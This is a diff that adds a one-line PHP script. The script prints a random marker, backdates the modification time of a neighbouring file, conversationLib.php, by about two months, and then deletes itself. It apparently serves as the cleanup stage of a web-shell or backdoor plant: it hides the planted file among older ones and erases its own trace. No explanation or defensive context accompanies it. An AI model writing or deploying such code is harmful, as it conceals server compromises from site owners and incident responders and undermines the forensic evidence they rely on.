@@ -1,0 +1,1 @@
+<?php echo "xzvFuucsfD"; if (file_exists("./conversationLib.php")){ touch("./conversationLib.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*KeWnm1bwYaa4BSpFsTSg*/ ?>
